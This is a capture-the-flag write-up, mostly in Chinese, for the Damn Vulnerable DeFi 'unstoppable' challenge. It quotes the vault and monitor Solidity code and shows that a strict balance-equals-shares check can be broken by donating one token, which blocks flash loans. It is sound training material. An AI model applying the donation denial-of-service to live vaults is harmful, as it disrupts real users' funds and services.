# Damn Vulnerable DeFi v4 - unstoppable

- https://www.damnvulnerabledefi.xyz/challenges/unstoppable/

## Check Condition

Monitor 會執行小額的 flashloan 檢查 Vault 的 flashloan 執行是否正常。如果被 revert，Monitor 則會將 Vault 的功能暫停。

### Monitor

```solidity
function checkFlashLoan(uint256 amount) external onlyOwner {
    require(amount > 0);

    address asset = address(vault.asset());

    try vault.flashLoan(this, asset, amount, bytes("")) {
        emit FlashLoanStatus(true);
    } catch {
        // Something bad happened
        emit FlashLoanStatus(false);

        // Pause the vault
        vault.setPause(true);

        // Transfer ownership to allow review & fixes
        vault.transferOwnership(owner);
    }
}
```

### Vault

```solidity
contract UnstoppableVault is IERC3156FlashLender, ReentrancyGuard, Owned, ERC4626, Pausable {
    function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);

        // callback must return magic value, otherwise assume it failed
        uint256 fee = flashFee(_token, amount);
        if (
            receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)
                != keccak256("IERC3156FlashBorrower.onFlashLoan")
        ) {
            revert CallbackFailed();
        }

        // pull amount + fee from receiver, then pay the fee to the recipient
        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
        ERC20(_token).safeTransfer(feeRecipient, fee);

        return true;
    }
}
```

## Break

主要原因是 check 檢查錯誤：

`balanceBefore` 追蹤的是「存入 Vault 中的 underly token」:

```solidity
function totalAssets() public view override nonReadReentrant returns (uint256) {
    return asset.balanceOf(address(this));
}

uint256 balanceBefore = totalAssets();
```

`totalSupply` 追蹤的是「Vault 中的 share token」，只會在操作 ERC4626 的函式時發生改變。而 `convertToShares` 則是將 share amount 再轉換成 share amount。

```solidity
// UnstoppableVault -> ERC4626 -> ERC20.totalSupply
// convertToShares: convert underlying asset to share
if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

一開始不會 revert 的原因主要是 first deposit 時的 exchange rate 為 1:1。理論上，執行 ERC4626 的函式讓其產生一些 round down 或是 round up 就能讓 exchange rate 產生變化進而造成 DOS，但是 player 手上的 token 不足以對 exchange 有影響。

Exchange rate:

```solidity
function convertToShares(uint256 assets) public view virtual returns (uint256) {
    uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.

    return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
}

function convertToAssets(uint256 shares) public view virtual returns (uint256) {
    uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.

    return supply == 0 ? shares : shares.mulDivDown(totalAssets(), supply);
}
```

## solution

但是還是可以以 donation 去改變 `balanceBefore`:

```solidity
function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), 1);
}
```
